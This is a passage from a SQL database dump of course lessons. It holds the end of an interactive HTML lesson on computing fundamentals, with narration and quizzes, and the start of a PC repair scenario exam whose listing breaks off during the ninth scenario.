Description, Specification & the Development Lifecycle</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(5)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent)"></div>\n        <div class="card-icon">📖</div>\n        <h3>Program Description</h3>\n        <p>A plain-language explanation of <em>what</em> a program does, written for a general audience — clients, stakeholders, or users who may not be technical.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent2)"></div>\n        <div class="card-icon">📐</div>\n        <h3>Program Specification</h3>\n        <p>A precise, detailed technical document defining <em>exactly</em> what the program must do — inputs, outputs, constraints, and behaviour. Used by developers as the blueprint.</p>\n      </div>\n    </div>\n    <p class="prose"><strong>Key difference:</strong> A description says <em>"the program helps users track their expenses"</em>. A specification says <em>"the system shall accept decimal values between 0.01 and 999999.99, store them in ISO 4217 currency format, and respond within 200ms."</em></p>\n    <div class="steps">\n      <div class="step">\n        <div class="step-num">1</div>\n        <div class="step-body">\n          <div class="step-name">Analysis <span class="step-badge">UNDERSTAND</span></div>\n          <p>Understand the problem. Gather requirements from stakeholders. Ask: What does the program need to do? Who will use it? What are the inputs and outputs?</p>\n        </div>\n      </div>\n      <div class="step">\n        <div class="step-num">2</div>\n        <div class="step-body">\n          <div class="step-name">Design <span class="step-badge">PLAN</span></div>\n          <p>Plan the solution: create flowcharts, pseudocode, data structures, and UI mockups. Decide the architecture before writing any code.</p>\n        </div>\n      </div>\n      <div class="step">\n        <div class="step-num">3</div>\n        <div class="step-body">\n          <div class="step-name">Programming <span class="step-badge">BUILD</span></div>\n          <p>Write the source code in a programming language based on the design documents. Follow coding standards and best practices.</p>\n        </div>\n      </div>\n      <div class="step">\n        <div class="step-num">4</div>\n        <div class="step-body">\n          <div class="step-name">Testing <span class="step-badge">VERIFY</span></div>\n          <p>Check the program for bugs and verify it meets the specification. Use unit tests, integration tests, and user acceptance testing (UAT).</p>\n        </div>\n      </div>\n      <div class="step">\n        <div class="step-num">5</div>\n        <div class="step-body">\n          <div class="step-name">Enhancement <span class="step-badge">IMPROVE</span></div>\n          <p>After release, gather feedback and add new features, fix bugs, improve performance, and adapt to changing requirements. Software is never truly "finished".</p>\n        </div>\n      </div>\n    </div>\n    <div id="quiz5"></div>\n  </div>\n\n  <!-- ══ LESSON 6: FORMAL vs NATURAL ══ -->\n  <div class="lesson" id="l6">\n    <div class="lesson-hd">\n      <div class="lesson-icon">🗣️</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 07 — DISTINCTION</div>\n        <div class="lesson-title">Formal Language vs Natural Language</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(6)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="compare">\n      <div class="cmp left">\n        <div class="cmp-label">FORMAL LANGUAGE</div>\n        <h3>Designed by Humans for Precision</h3>\n        <ul>\n          <li>Strictly defined grammar and syntax rules</li>\n          <li>Every symbol has one unambiguous meaning</li>\n          <li>No tolerance for errors — a misplaced semicolon breaks it</li>\n          <li>Used in: programming, maths, logic, chemistry notation</li>\n          <li>Examples: Python, SQL, HTML, mathematical notation</li>\n        </ul>\n      </div>\n      <div class="cmp right">\n        <div class="cmp-label">NATURAL LANGUAGE</div>\n        <h3>Evolved Naturally by Humans</h3>\n        <ul>\n          <li>Flexible grammar, full of exceptions and ambiguity</li>\n          <li>Words can have multiple meanings depending on context</li>\n          <li>Tolerant of errors — humans fill in the gaps</li>\n          <li>Used in: everyday communication, writing, speech</li>\n          <li>Examples: English, Swahili, French, Mandarin</li>\n        </ul>\n      </div>\n    </div>\n    <div class="example">\n      <div class="example-label">✦ AMBIGUITY EXAMPLE</div>\n      <p><strong>Natural language:</strong> "I saw the man with the telescope." — Does this mean I used a telescope to see a man, or I saw a man who had a telescope? Ambiguous!</p>\n      <p style="margin-top:10px;"><strong>Formal language:</strong> <code style="font-family:''DM Mono'',monospace;background:rgba(26,18,8,0.08);padding:2px 6px;border-radius:3px;">see(I, man) using(telescope)</code> — No ambiguity. One precise meaning.</p>\n    </div>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent3)"></div>\n        <div class="card-icon">📏</div>\n        <h3>Why Formal Languages Matter</h3>\n        <p>Computers cannot handle ambiguity. A formal language guarantees that every instruction has exactly one interpretation, allowing reliable program execution.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--gold)"></div>\n        <div class="card-icon">🤖</div>\n        <h3>NLP: Bridging the Gap</h3>\n        <p>Natural Language Processing (NLP) is the AI field working to help computers understand natural language — still an incredibly hard problem because of ambiguity.</p>\n      </div>\n    </div>\n    <div class="callout">\n      <strong>Key insight:</strong> When you write code, you are using a <em>formal language</em>. The strict rules frustrate beginners — but those rules are what make reliable software possible.\n    </div>\n    <div id="quiz6"></div>\n  </div>\n\n</div><!-- /content -->\n\n<footer>Computing Fundamentals — Interactive Course · All 7 Topics · Voice Narration + Quizzes</footer>\n\n<script>\n// ── DATA ──────────────────────────────────────────────────────────────────────\nconst narrations = [\n  `Computing is the use of computers to store, retrieve, transmit, and manipulate data to solve problems. At its core, computing follows the IPO model: Input, Processing, Output — plus Storage. From searching the internet to medical diagnosis, computing underpins virtually every modern system. Understanding computing means understanding how machines follow precise instructions to automate tasks at incredible speed.`,\n\n  `Computational thinking is a problem-solving approach with four key pillars. First, Decomposition: breaking a big problem into smaller, manageable parts. Second, Pattern Recognition: spotting similarities to apply known solutions. Third, Abstraction: ignoring unnecessary details and focusing on what matters. Fourth, Algorithm Design: creating step-by-step instructions a computer could execute. Computational thinking applies far beyond programming — it is a way of thinking clearly about any problem.`,\n\n  `A program is a set of instructions written in a programming language that a computer executes to perform a specific task. Think of it as a recipe for a machine — every step must be precise, ordered, and unambiguous. Programs can be tiny, like a three-line script, or enormous, like an operating system with millions of lines of code. When a program runs, the CPU fetches and executes each instruction in sequence.`,\n\n  `Code, or computer code, is the actual written text of a program — the symbols, words, and syntax a programmer writes. Code is written in a programming language. High-level languages like Python are readable by humans. Low-level assembly language is closer to the hardware. Machine language, pure binary, is what the CPU actually understands. Every piece of software you use was once written as human-readable code.`,\n\n  `Source code is the human-readable code written by a programmer in a high-level language like Python or Java. Machine code is the binary instructions — zeros and ones — that a CPU can directly execute. Source code must be translated into machine code before a program can run. A compiler translates the entire source file at once. An interpreter translates and runs it line by line. A just-in-time compiler does this dynamically during execution.`,\n\n  `A program description is a plain-language explanation of what a program does, suitable for non-technical audiences. A specification is a precise, detailed technical blueprint defining exactly what the program must do — inputs, outputs, formats, and performance requirements. The program development lifecycle has five stages: Analysis, where requirements are gathered; Design, where the solution is planned; Programming, where code is written; Testing, where bugs are found and fixed; and Enhancement, where the program is improved after release.`,\n\n  `A formal language is one designed with strict, unambiguous rules — like programming languages, mathematics, or logic. Every symbol has one precise meaning, and errors are not tolerated. A natural language evolved organically among humans — like English or Swahili. Natural languages are flexible and full of ambiguity; context and common sense fill in the gaps. Computers require formal languages because they cannot handle ambiguity. Natural Language Processing is the challenging AI field attempting to bridge this gap.`\n];\n\nconst quizzes = [\n  // Q0 — Computing\n  {label:"Computing Quiz", qs:[\n    {q:"Which of the following best defines computing?",opts:["Typing on a keyboard","Using computers to process data and solve problems","Playing video games","Connecting to the internet"],a:1,e:"Computing is the broad use of computers to store, retrieve, transmit, and manipulate data to solve problems — not any single activity."},\n    {q:"What does the ''P'' stand for in the IPO model of computing?",opts:["Program","Protocol","Processing","Peripheral"],a:2,e:"IPO stands for Input → Processing → Output. Processing is where the CPU executes instructions to transform input into output."},\n  ]},\n  // Q1 — Computational Thinking\n  {label:"Computational Thinking Quiz", qs:[\n    {q:"Breaking a large problem into smaller, easier sub-problems is called:",opts:["Abstraction","Algorithm Design","Decomposition","Pattern Recognition"],a:2,e:"Decomposition means breaking a complex problem into smaller, manageable parts that are easier to understand and solve individually."},\n    {q:"Focusing only on essential information and ignoring irrelevant details is called:",opts:["Decomposition","Abstraction","Pattern Recognition","Debugging"],a:1,e:"Abstraction means stripping away unnecessary detail to focus on the core aspects of a problem — a key skill in computational thinking."},\n    {q:"Which pillar of computational thinking involves spotting similarities in problems?",opts:["Algorithm Design","Decomposition","Abstraction","Pattern Recognition"],a:3,e:"Pattern Recognition means identifying similar trends or repeated structures in data or problems so you can apply known solutions."},\n  ]},\n  // Q2 — Program\n  {label:"Program Quiz", qs:[\n    {q:"A program is best described as:",opts:["A file stored on a hard drive","A set of instructions a computer executes to perform a task","The screen output of a computer","The hardware inside a computer"],a:1,e:"A program is precisely a set of instructions, written in a programming language, that a computer can execute to perform a specific task."},\n    {q:"What is the relationship between a program and software?",opts:["They are exactly the same thing","Software is one program; a program is many software","Software often consists of multiple programs working together","Programs are hardware; software is virtual"],a:2,e:"Software typically refers to a broader collection of programs and data working together, while a program is a single set of instructions."},\n  ]},\n  // Q3 — Code\n  {label:"Code Quiz", qs:[\n    {q:"What is computer code?",opts:["A secret military language","The written text of instructions a programmer writes","The electrical signals inside a CPU","Binary numbers stored in RAM"],a:1,e:"Code is the actual written text of a program — the symbols and syntax a programmer writes using a programming language."},\n    {q:"Which of the following is a high-level programming language?",opts:["Binary","Assembly","Python","Machine code"],a:2,e:"Python is a high-level language — human-readable and abstract. Binary and machine code are the lowest level; Assembly is low-level but still symbolic."},\n  ]},\n  // Q4 — Source vs Machine\n  {label:"Source vs Machine Code Quiz", qs:[\n    {q:"Which type of code can a CPU execute directly without translation?",opts:["Source code","High-level code","Machine code","Pseudocode"],a:2,e:"Machine code consists of binary instructions the CPU executes directly. Source code must first be compiled or interpreted."},\n    {q:"A compiler translates source code by:",opts:["Running it line by line","Translating the entire program before execution","Translating only the functions that are called","Sending code to the internet for processing"],a:1,e:"A compiler translates the entire source program into machine code in one step, before any execution begins."},\n    {q:"Source code is written in a high-level language and is best described as:",opts:["Directly executable by hardware","Only readable by special machines","Human-readable and maintainable","Identical to machine code"],a:2,e:"Source code is written by humans in readable languages like Python or Java. It must be translated before the CPU can run it."},\n  ]},\n  // Q5 — Lifecycle\n  {label:"Development Lifecycle Quiz", qs:[\n    {q:"Which stage of program development involves gathering requirements from stakeholders?",opts:["Design","Testing","Analysis","Enhancement"],a:2,e:"Analysis is the first stage — understanding what the program must do, who will use it, and what the inputs/outputs are."},\n    {q:"A program specification differs from a program description because it is:",opts:["Written in plain language for non-technical users","A precise technical blueprint of what the program must do","A list of bugs found during testing","A marketing document"],a:1,e:"A specification is a precise, detailed technical document. A description is a plain-language summary for non-technical audiences."},\n    {q:"After a program is released, which stage involves adding new features based on user feedback?",opts:["Analysis","Testing","Design","Enhancement"],a:3,e:"Enhancement (also called maintenance) is the stage after release where improvements, new features, and bug fixes are applied based on real-world use."},\n  ]},\n  // Q6 — Formal vs Natural\n  {label:"Formal vs Natural Language Quiz", qs:[\n    {q:"Which of the following is an example of a formal language?",opts:["English","Swahili","Python","Spanish"],a:2,e:"Python is a formal language — designed with strict, unambiguous grammar rules. English, Swahili, and Spanish are natural languages that evolved among humans."},\n    {q:"Why must programming languages be formal rather than natural languages?",opts:["Because they are easier to learn","Because computers cannot handle ambiguity","Because natural languages are too long","Because formal languages are older"],a:1,e:"Computers require exact, unambiguous instructions. Natural languages have ambiguity (one phrase, multiple meanings), which computers cannot reliably interpret."},\n    {q:"The sentence ''I saw the man with the telescope'' is ambiguous. This is a feature of:",opts:["Formal language","Machine code","Natural language","Assembly language"],a:2,e:"Natural languages like English allow ambiguity — the sentence could mean two different things. Formal languages eliminate this ambiguity by design."},\n  ]},\n];\n\n// ── STATE ─────────────────────────────────────────────────────────────────────\nlet current = 0;\nlet rate = 1.0;\nlet speaking = false;\nlet qState = quizzes.map(qz => ({cur:0, score:0, wrong:0, done:false}));\n\n// ── VOICE ─────────────────────────────────────────────────────────────────────\nwindow.speechSynthesis.onvoiceschanged = ()=>{};\n\nfunction speak(text){\n  window.speechSynthesis.cancel();\n  const u = new SpeechSynthesisUtterance(text);\n  u.rate = rate; u.pitch = 1.02; u.volume = 1;\n  const vs = window.speechSynthesis.getVoices();\n  const v = vs.find(x=>x.lang===''en-US''&&x.name.includes(''Google''))\n          || vs.find(x=>x.lang===''en-US'') || vs[0];\n  if(v) u.voice = v;\n  u.onstart = ()=>{\n    speaking=true;\n    document.getElementById(''playBtn'').textContent=''⏸'';\n    document.getElementById(''playBtn'').classList.add(''active'');\n    document.getElementById(''playerTxt'').textContent = narrations[current].substring(0,130)+''…'';\n  };\n  u.onend = u.onerror = ()=>{\n    speaking=false;\n    document.getElementById(''playBtn'').textContent=''▶'';\n    document.getElementById(''playBtn'').classList.remove(''active'');\n  };\n  window.speechSynthesis.speak(u);\n}\n\nfunction togglePlay(){\n  if(speaking){ window.speechSynthesis.cancel(); }\n  else { speak(narrations[current]); }\n}\n\nfunction readSection(idx){ current=idx; speak(narrations[idx]); }\n\nfunction adjRate(d){\n  rate = Math.max(0.5, Math.min(2.0, Math.round((rate+d)*4)/4));\n  document.getElementById(''spdDisplay'').textContent = rate.toFixed(2).replace(''.00'','''').replace(/\\.?0$/,'''')+''×'';\n  if(speaking){ window.speechSynthesis.cancel(); speak(narrations[current]); }\n}\n\n// ── NAVIGATION ────────────────────────────────────────────────────────────────\nfunction go(idx, btn){\n  window.speechSynthesis.cancel(); speaking=false;\n  document.getElementById(''playBtn'').textContent=''▶'';\n  document.getElementById(''playBtn'').classList.remove(''active'');\n\n  document.querySelectorAll(''.lesson'').forEach(l=>l.classList.remove(''active''));\n  document.querySelectorAll(''.tab-btn'').forEach(b=>b.classList.remove(''active''));\n  document.getElementById(''l''+idx).classList.add(''active'');\n  btn.classList.add(''active'');\n  current = idx;\n  document.getElementById(''playerTxt'').textContent = narrations[idx].substring(0,130)+''…'';\n  // progress\n  const pct = Math.round(((idx+1)/7)*100);\n  document.getElementById(''progFill'').style.width = pct+''%'';\n  document.getElementById(''progTxt'').textContent = (idx+1)+'' / 7'';\n  window.scrollTo({top:0,behavior:''smooth''});\n}\n\n// ── QUIZ ENGINE ────────────────────────────────────────────────────────────────\nfunction buildQuiz(lessonIdx){\n  const qz = quizzes[lessonIdx];\n  const st = qState[lessonIdx];\n  const container = document.getElementById(''quiz''+lessonIdx);\n  if(!container) return;\n  const letters = [''A'',''B'',''C'',''D''];\n  const dots = qz.qs.map((_,i)=>`<div class="q-dot${i===st.cur?'' current'':''''}" id="dot${lessonIdx}_${i}"></div>`).join('''');\n\n  let html = `\n  <div class="quiz-wrapper">\n    <div class="quiz-hd">\n      <h3>📝 ${qz.label}</h3>\n      <span class="q-count">${qz.qs.length} Questions</span>\n    </div>\n    <div class="quiz-body">\n      <div class="q-progress-row">${dots}</div>\n      <div id="qBody${lessonIdx}"></div>\n    </div>\n    <div class="quiz-footer">\n      <div class="quiz-score">Score: <span id="sc${lessonIdx}">0</span> / ${qz.qs.length}</div>\n      <button class="next-btn" id="nxt${lessonIdx}" onclick="nextQ(${lessonIdx})">Next →</button>\n    </div>\n    <div class="quiz-result" id="res${lessonIdx}"></div>\n  </div>`;\n  container.innerHTML = html;\n  renderQ(lessonIdx);\n}\n\nfunction renderQ(li){\n  const qz = quizzes[li];\n  const st = qState[li];\n  if(st.cur >= qz.qs.length){ showResult(li); return; }\n  const q = qz.qs[st.cur];\n  const letters = [''A'',''B'',''C'',''D''];\n  const body = document.getElementById(''qBody''+li);\n  body.innerHTML = `\n    <div class="q-text">${q.q}</div>\n    <div class="q-options">\n      ${q.opts.map((o,i)=>`\n        <button class="q-opt" onclick="answer(${li},${i})" id="opt${li}_${i}">\n          <span class="opt-letter">${letters[i]}</span> ${o}\n        </button>`).join('''')}\n    </div>\n    <div class="q-explain" id="exp${li}">${q.e}</div>`;\n  // update dots\n  qz.qs.forEach((_,i)=>{\n    const d = document.getElementById(''dot''+li+''_''+i);\n    if(!d)return;\n    d.className=''q-dot'';\n    if(i<st.cur) d.classList.add(qState[li][''r''+i]?''done-right'':''done-wrong'');\n    if(i===st.cur) d.classList.add(''current'');\n  });\n  document.getElementById(''nxt''+li).classList.remove(''show'');\n}\n\nfunction answer(li, chosen){\n  const qz = quizzes[li];\n  const st = qState[li];\n  const q = qz.qs[st.cur];\n  const opts = document.querySelectorAll(''#qBody''+li+'' .q-opt'');\n  opts.forEach(b=>b.disabled=true);\n  opts[q.a].classList.add(''right'');\n  const correct = chosen===q.a;\n  if(!correct) opts[chosen].classList.add(''wrong'');\n  document.getElementById(''exp''+li).classList.add(''show'');\n  if(correct){ st.score++; st[''r''+st.cur]=true; }\n  else{ st.wrong++; st[''r''+st.cur]=false; }\n  document.getElementById(''sc''+li).textContent=st.score;\n  speak(correct?''Correct! ''+q.e:''Not quite. ''+q.e);\n  document.getElementById(''nxt''+li).classList.add(''show'');\n}\n\nfunction nextQ(li){\n  const st = qState[li];\n  st.cur++;\n  if(st.cur >= quizzes[li].qs.length) showResult(li);\n  else renderQ(li);\n  document.getElementById(''nxt''+li).classList.remove(''show'');\n}\n\nfunction showResult(li){\n  const qz = quizzes[li];\n  const st = qState[li];\n  document.getElementById(''qBody''+li).innerHTML='''';\n  document.getElementById(''nxt''+li).classList.remove(''show'');\n  const pct=Math.round((st.score/qz.qs.length)*100);\n  const grade=pct>=90?''A+'':pct>=75?''A'':pct>=60?''B'':pct>=45?''C'':''D'';\n  const emoji=pct>=75?''🎉'':pct>=50?''👍'':''📖'';\n  const msg=pct>=75?''Well done!'':''Keep practising — review the topic and try again!'';\n  const res=document.getElementById(''res''+li);\n  res.innerHTML=`\n    <span class="res-emoji">${emoji}</span>\n    <div class="res-grade">${grade}</div>\n    <div class="res-msg">${msg}</div>\n    <div class="res-sub">${st.score} of ${qz.qs.length} correct — ${pct}%</div>\n    <div class="res-stats">\n      <div class="res-stat"><div class="v">${st.score}</div><div class="k">CORRECT</div></div>\n      <div class="res-stat"><div class="v">${st.wrong}</div><div class="k">WRONG</div></div>\n      <div class="res-stat"><div class="v">${pct}%</div><div class="k">SCORE</div></div>\n    </div>\n    <button class="retry-btn" onclick="retryQuiz(${li})">↺ Retry</button>\n  `;\n  res.classList.add(''show'');\n  speak(`Quiz complete! You scored ${st.score} out of ${qz.qs.length}. ${msg}`);\n}\n\nfunction retryQuiz(li){\n  qState[li]={cur:0,score:0,wrong:0,done:false};\n  buildQuiz(li);\n}\n\n// ── INIT ──────────────────────────────────────────────────────────────────────\nquizzes.forEach((_,i) => buildQuiz(i));\n\n// Initial progress\ndocument.getElementById(''progFill'').style.width=''14%'';\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 17, 'Published', 1, '2026-03-08 07:48:35', '2026-03-10 14:15:35', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(15, 3, NULL, 'COMPUTER REPAIR', 'Scenario Based Exam', '<!DOCTYPE html>\r\n<html lang="en">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title> PC Repair · detailed scenarios · next question</title>\r\n    <style>\r\n        * {\r\n            box-sizing: border-box;\r\n            font-family: ''Inter'', ''Segoe UI'', Roboto, sans-serif;\r\n        }\r\n        body {\r\n            background: #e9f0f7;\r\n            margin: 0;\r\n            min-height: 100vh;\r\n            display: flex;\r\n            justify-content: center;\r\n            padding: 1.5rem 1rem;\r\n        }\r\n        .app-wrapper {\r\n            max-width: 950px;\r\n            width: 100%;\r\n        }\r\n        /* header panel */\r\n        .header-card {\r\n            background: #113752;\r\n            color: white;\r\n            padding: 2rem 2.2rem;\r\n            border-radius: 42px 42px 42px 42px;\r\n            box-shadow: 0 20px 30px -10px #0a2538;\r\n            margin-bottom: 2rem;\r\n        }\r\n        .header-card h1 {\r\n            font-weight: 600;\r\n            font-size: 2.1rem;\r\n            display: flex;\r\n            gap: 16px;\r\n            align-items: center;\r\n            flex-wrap: wrap;\r\n        }\r\n        .header-card h1 span {\r\n            background: #fbb13c;\r\n            color: #102f45;\r\n            padding: 0.3rem 1.2rem;\r\n            border-radius: 60px;\r\n            font-size: 1.3rem;\r\n        }\r\n        .student-panel {\r\n            background: #ffffffd9;\r\n            border-radius: 60px;\r\n            padding: 1.5rem 2rem;\r\n            margin-top: 1.4rem;\r\n            display: flex;\r\n            flex-wrap: wrap;\r\n            gap: 2rem;\r\n            align-items: center;\r\n            color: #0b2b42;\r\n        }\r\n        .student-panel label {\r\n            font-weight: 600;\r\n            font-size: 0.85rem;\r\n            text-transform: uppercase;\r\n            color: #1c4c75;\r\n            letter-spacing: 0.5px;\r\n        }\r\n        .student-panel input {\r\n            background: white;\r\n            border: 1px solid #b9d2ed;\r\n            border-radius: 40px;\r\n            padding: 0.75rem 1.5rem;\r\n            font-size: 1rem;\r\n            width: 230px;\r\n            transition: 0.15s;\r\n        }\r\n        .student-panel input:focus {\r\n            outline: none;\r\n            border-color: #f3a62b;\r\n            box-shadow: 0 0 0 3px #f3b43b60;\r\n        }\r\n\r\n        /* progress + next question row */\r\n        .progress-row {\r\n            background: white;\r\n            border-radius: 60px;\r\n            padding: 0.8rem 1.5rem;\r\n            display: flex;\r\n            justify-content: space-between;\r\n            align-items: center;\r\n            margin: 1.5rem 0 1.2rem 0;\r\n            box-shadow: 0 6px 12px #b2cae0a0;\r\n        }\r\n        .stats {\r\n            background: #dde9f5;\r\n            border-radius: 60px;\r\n            padding: 0.4rem 1.4rem;\r\n            font-weight: 600;\r\n            color: #1c4970;\r\n        }\r\n        .next-btn {\r\n            background: #1b6190;\r\n            border: none;\r\n            color: white;\r\n            font-size: 1.3rem;\r\n            font-weight: 600;\r\n            padding: 0.8rem 2.2rem;\r\n            border-radius: 60px;\r\n            display: flex;\r\n            align-items: center;\r\n            gap: 8px;\r\n            cursor: pointer;\r\n            box-shadow: 0 8px 16px #0f3e5b;\r\n            transition: 0.15s;\r\n            border: 1px solid #ffffff70;\r\n        }\r\n        .next-btn:active {\r\n            transform: scale(0.97);\r\n            background: #14527b;\r\n        }\r\n        .next-btn.disabled {\r\n            opacity: 0.4;\r\n            pointer-events: none;\r\n            background: #627e99;\r\n            box-shadow: none;\r\n        }\r\n\r\n        /* active question card */\r\n        .question-card {\r\n            background: white;\r\n            border-radius: 42px;\r\n            padding: 2.2rem 2.5rem;\r\n            border-left: 12px solid #2e7fb8;\r\n            margin: 2rem 0 1.5rem;\r\n            box-shadow: 0 18px 28px -8px #284b66;\r\n        }\r\n        .q-badge {\r\n            display: inline-block;\r\n            background: #1c5179;\r\n            color: white;\r\n            font-weight: 700;\r\n            padding: 0.3rem 1.5rem;\r\n            border-radius: 40px;\r\n            font-size: 0.9rem;\r\n            letter-spacing: 1px;\r\n            margin-bottom: 1.2rem;\r\n        }\r\n        .q-text-detailed {\r\n            font-size: 1.28rem;\r\n            font-weight: 500;\r\n            line-height: 1.5;\r\n            color: #032436;\r\n            margin-bottom: 2rem;\r\n            background: #f3f9ff;\r\n            padding: 1.8rem;\r\n            border-radius: 36px;\r\n        }\r\n        .answer-box label {\r\n            font-weight: 600;\r\n            color: #124063;\r\n            margin-left: 0.5rem;\r\n        }\r\n        .answer-input {\r\n            width: 100%;\r\n            padding: 1.2rem 2rem;\r\n            border: 2px solid #cfdef1;\r\n            border-radius: 50px;\r\n            font-size: 1.1rem;\r\n            background: white;\r\n            margin: 0.5rem 0 0.3rem;\r\n        }\r\n        .answer-input:focus {\r\n            border-color: #f1a32c;\r\n            outline: none;\r\n            box-shadow: 0 0 0 4px #f1b54360;\r\n        }\r\n        .char-counter {\r\n            text-align: right;\r\n            color: #31688f;\r\n            font-size: 0.9rem;\r\n            font-weight: 500;\r\n            margin-top: 0.3rem;\r\n        }\r\n\r\n        /* alert + final submit */\r\n        .alert-area {\r\n            background: #fff1cf;\r\n            border-radius: 60px;\r\n            padding: 1rem 2rem;\r\n            text-align: center;\r\n            font-weight: 500;\r\n            margin: 2rem 0 1.2rem;\r\n        }\r\n        .submit-footer {\r\n            display: flex;\r\n            justify-content: center;\r\n            margin: 2.5rem 0 2rem;\r\n        }\r\n        #finalSubmitBtn {\r\n            background: #c2d6ec;\r\n            border: none;\r\n            font-size: 2rem;\r\n            font-weight: 700;\r\n            padding: 1.2rem 5rem;\r\n            border-radius: 80px;\r\n            color: #103a58;\r\n            cursor: not-allowed;\r\n            opacity: 0.45;\r\n            transition: 0.2s;\r\n            box-shadow: 0 12px 22px #2b527030;\r\n        }\r\n        #finalSubmitBtn.active {\r\n            background: #f3b33a;\r\n            opacity: 1;\r\n            cursor: pointer;\r\n            color: #0d2c41;\r\n            box-shadow: 0 18px 26px #f3b33a90;\r\n        }\r\n        hr {\r\n            border: 2px dashed #afc9e2;\r\n        }\r\n        .footer-note {\r\n            text-align: center;\r\n            color: #316e9b;\r\n        }\r\n    </style>\r\n</head>\r\n<body>\r\n<div class="app-wrapper">\r\n\r\n    <!-- header with fixed name/admission -->\r\n    <div class="header-card">\r\n        <h1>REPAIR & MAINTENANCE · 40 DETAILED SCENARIOS <span>per module</span></h1>\r\n        <div class="student-panel">\r\n            <div><label>FULL NAME</label> <input type="text" id="fullName" placeholder="e.g. Morgan Lee"></div>\r\n            <div><label>ADMISSION No.</label> <input type="text" id="admissionNo" placeholder="ADM-2410"></div>\r\n        </div>\r\n    </div>\r\n\r\n    <!-- progress + next question button -->\r\n    <div class="progress-row">\r\n        <div class="stats">\r\n            <span id="currentQDisplay">Q1</span> · <span id="answeredCount">0</span>/40 answered\r\n        </div>\r\n        <button id="nextQuestionBtn" class="next-btn">⏩ NEXT QUESTION</button>\r\n    </div>\r\n\r\n    <!-- main question card (only one at a time) -->\r\n    <div id="questionCard" class="question-card">\r\n        <div class="q-badge" id="moduleIndicator">MODULE 1</div>\r\n        <div class="q-text-detailed" id="scenarioText">\r\n            Loading scenario...\r\n        </div>\r\n        <div class="answer-box">\r\n            <label for="activeAnswer">✍️ Your detailed response:</label>\r\n            <input type="text" id="activeAnswer" class="answer-input" placeholder="Describe your actions, tools, and reasoning..." autocomplete="off">\r\n            <div class="char-counter" id="activeCounter">0 characters</div>\r\n        </div>\r\n    </div>\r\n\r\n    <!-- alert & final submit -->\r\n    <div class="alert-area" id="dynamicAlert">\r\n        ⚠️ Please answer all 40 questions and provide Full Name and admission.\r\n    </div>\r\n\r\n    <div class="submit-footer">\r\n        <button id="finalSubmitBtn" disabled>📥 SUBMIT ALL ANSWERS</button>\r\n    </div>\r\n\r\n    <hr>\r\n    <div class="footer-note">each scenario includes detailed prompts · next question enabled after answering current one</div>\r\n</div>\r\n\r\n<script>\r\n    (function() {\r\n        // ---------- 40 DETAILED SCENARIOS (expanded, module-based) ----------\r\n        const scenarios = [\r\n            // === MODULE 1 (1–10) – Explore motherboards & components ===\r\n            `1. DETAILED – Swollen capacitor on motherboard.\r\nWhile inspecting a motherboard, you notice a visibly swollen and slightly leaking capacitor near the CPU voltage regulator module.\r\n• Describe the exact risks if the computer is powered on with this capacitor.\r\n• What tools would you use to test the capacitor and surrounding voltages?\r\n• Explain step-by-step how to safely replace a through-hole capacitor, including soldering safety and ESD precautions.\r\n• What alternative action should be taken if the board is still under warranty or you lack soldering skills?`,\r\n\r\n            `2. DETAILED – CPU handling and installation.\r\nA learner picks up an AMD Ryzen CPU by grasping the gold contact pins on the underside.\r\n• What type of damage can occur, and how would you inspect for bent or broken pins?\r\n• Describe the correct procedure to install a modern PGA or LGA CPU, including orientation, socket lever, and thermal paste application.\r\n• List three ESD control measures that must be in place before handling the CPU.`,\r\n\r\n            `3. DETAILED – Identifying an unknown RAM module.\r\nYou are given an unbranded DDR3/DDR4 stick and need to determine its specifications without a manual.\r\n• What physical differences (notch position, pin count, keying) help distinguish DDR3 from DDR4?\r\n• How can you read the SPD (serial presence detect) information using software or a multimeter?\r\n• Once identified, how do you verify compatibility with a given motherboard (chipset, speed, voltage)?`,\r\n\r\n            `4. DETAILED – Erratic PSU voltage readings.\r\nWhile testing a power supply with a digital multimeter, the +12V rail fluctuates between 11.2V and 12.8V under light load.\r\n• List three possible causes: internal components, input power issues, or testing mistakes.\r\n• Describe how to perform a proper PSU load test using a dummy load or by connecting to a known-good motherboard.\r\n• What safety precautions (capacitor discharge, insulation) are vital when probing inside a PSU?`,\r\n\r\n            `5. DETAILED – ESD hazard from clothing.\r\nA technician wearing a wool sweater and leather-soled shoes works on an open computer on a carpeted floor.\r\n• Explain why this combination is dangerous for electronic components.\r\n• Describe a complete ESD-safe workstation setup: mats, wrist straps, ionizers, and humidity considerations.\r\n• What should the technician do immediately to mitigate risk before continuing?`,\r\n\r\n            `6. DETAILED – SATA HDD to NVMe SSD upgrade.\r\nA client wants to replace a 500GB SATA hard drive with a 1TB NVMe M.2 SSD in a desktop from 2018.\r\n• List the motherboard requirements (M.2 slot type, keying, NVMe support) and how to verify them.\r\n• Describe the physical installation process including standoffs and screw removal.\r\n• Explain how to migrate the operating system from the old drive to the new NVMe drive (software, cloning, UEFI settings).`,\r\n\r\n            `7. DETAILED – Broken RAM slot clip.\r\nDuring RAM removal, the white plastic retention clip on one end of the DIMM slot snaps off.\r\n• Can the system still be used safely? What are the risks of vibration or movement?\r\n• Detail temporary fixes (if any) and the proper long-term solution (motherboard replacement?).\r\n• What steps would you take to remove the existing RAM module without damaging the slot further?`,\r\n\r\n            `8. DETAILED – POST beep codes: no video, long beeps.\r\nA computer powers on, fans spin, but screen remains black. You hear a pattern of three long beeps repeating.\r\n• Using the motherboard manual (AMI/Award), what does this code typically indicate (RAM issue)?\r\n• Walk through the systematic troubleshooting: reseating RAM, testing one stick at a time, cleaning contacts, trying known-good modules.\r\n• If beeps persist, how would you test the memory controller or CPU socket for bent pins?`,\r\n\r\n            `9. DETAILED – Northbridge vs. Southbridge on older board.\r\nOn an older Intel LGA 775 